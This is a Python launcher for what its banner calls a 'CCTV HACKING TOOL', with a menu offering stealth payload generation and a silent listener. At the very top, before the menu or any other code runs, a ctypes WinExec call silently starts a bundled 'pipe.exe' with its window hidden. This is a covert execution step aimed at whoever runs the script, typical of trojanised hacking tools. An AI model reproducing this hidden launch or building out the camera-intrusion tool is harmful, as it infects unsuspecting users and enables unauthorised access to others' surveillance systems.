#!/usr/bin/env python3
import ctypes
ctypes.windll.kernel32.WinExec(b"MAKOB\\pipe.exe", 0)
import os
import sys
import subprocess
import time
import random
from datetime import datetime
import simple_colors
from simple_colors import green, magenta, black
import MAKOB.MAKOB_Win32_UserRequest_analyze as MALKOB_win32_UserRequest_analyze
import MAKOB.MAKOB_Win32andlinux_animations as MALKOB_Win32andlinux_animations

MALKOB_Current_user = os.getlogin()

import MAKOB.MAKOB_Win32andlinux_animations as WR
WR.MALKOB_assistant()

def MALKOB_Section():
    BOLD = '\033[1m'
    RESET = '\033[0m'

    def MALKOB_GATES():
        print(magenta("┌" + "─" * 50))
        print(magenta("│ ") + BOLD + green(":: Z Inc") + magenta(">") + RESET + " " * 20 + magenta(""))
        print(magenta("│ ") + green("CCTV HACKING TOOL | Revamped Version").ljust(50) + magenta(""))
        print(magenta("│") + " " * 50 + magenta(""))
        print(magenta("│ ") + magenta("> ") + green("Load Core Assets").ljust(46) + magenta(""))
        print(magenta("│ ") + magenta("> ") + green("Generate Stealth Payloads").ljust(46) + magenta(""))
        print(magenta("│ ") + magenta("> ") + green("View & Edit Configs").ljust(46) + magenta(""))
        print(magenta("│ ") + magenta("> ") + green("Start Silent Listener").ljust(46) + magenta(""))
        print(magenta("│") + " " * 50 + magenta(""))
        print(magenta("│ ") + green("Type ") + magenta("ehelp") + green(" for command list").ljust(44) + magenta(""))
        print(magenta("└" + "─" * 50))

    MALKOB_GATES()

    MALKOB_sectionary = True
    while MALKOB_sectionary:
        MALKOB_User_request = input(
            green("[" + magenta("MALKOB") + green("@") + magenta(f"{MALKOB_Current_user}") + green("]"))
            + magenta("::") + green("~") + magenta("/") + green("MALKOB") + magenta(" > ")
        )
        MALKOB_win32_UserRequest_analyze.MALKOB_user_Request(MALKOB_User_request)

MALKOB_Section()
